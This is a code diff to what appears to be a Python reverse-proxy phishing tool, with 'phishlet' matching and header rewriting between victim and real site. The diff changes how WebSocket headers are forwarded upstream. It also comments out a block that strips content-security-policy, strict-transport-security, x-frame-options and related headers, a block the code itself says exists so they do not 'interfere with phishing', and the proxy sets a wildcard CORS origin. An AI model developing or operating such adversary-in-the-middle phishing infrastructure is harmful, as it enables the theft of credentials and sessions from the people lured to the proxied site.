@@ -1895,8 +1895,8 @@ async def websocket_handler(request, target_ws_url, matching_phishlet=None):
     debug_log(f"Client host: {client_host}, Upstream host: {upstream_host}", "DEBUG")
     
     # For WebSocket, we don't have phishlet data, so use simple replacement
-    request.headers = patch_headers_out(request.headers, client_host, upstream_host)
-    debug_log(f"Patched headers: {dict(request.headers)}", "DEBUG")
+    forward_headers = patch_headers_out(request.headers, client_host, upstream_host)
+    debug_log(f"Patched headers: {forward_headers}", "DEBUG")
 
     try:
         debug_log("Creating client session for WebSocket", "DEBUG")
@@ -1913,7 +1913,7 @@ async def websocket_handler(request, target_ws_url, matching_phishlet=None):
             # Prepare WebSocket connection parameters
             ws_kwargs = {
                 'url': target_ws_url,
-                'headers': request.headers,
+                'headers': forward_headers,
                 'ssl': False,
             }
             
@@ -2825,19 +2825,19 @@ async def proxy_handler(request):
                     patched_headers["Access-Control-Allow-Origin"] = "*"
                     debug_log("Set Access-Control-Allow-Origin to *", "DEBUG")
                 # Remove security headers that might interfere with phishing
-                security_headers_to_remove = [
-                        "content-security-policy",
-                        "content-security-policy-report-only", 
-                        "strict-transport-security",
-                        "x-xss-protection",
-                        "x-content-type-options",
-                        "x-frame-options",
-                    ]
+                # security_headers_to_remove = [
+                #         "content-security-policy",
+                #         "content-security-policy-report-only", 
+                #         "strict-transport-security",
+                #         "x-xss-protection",
+                #         "x-content-type-options",
+                #         "x-frame-options",
+                #     ]
                 
-                for header in list(patched_headers.keys()):
-                    if header.lower() in security_headers_to_remove:
-                        del patched_headers[header]
-                        debug_log(f"Removed security header: {header}", "DEBUG")
+                # for header in list(patched_headers.keys()):
+                #     if header.lower() in security_headers_to_remove:
+                #         del patched_headers[header]
+                #         debug_log(f"Removed security header: {header}", "DEBUG")
                 
                 debug_log("CORS and security header processing completed", "DEBUG")
                 # === END CORS AND SECURITY HEADER PROCESSING ===
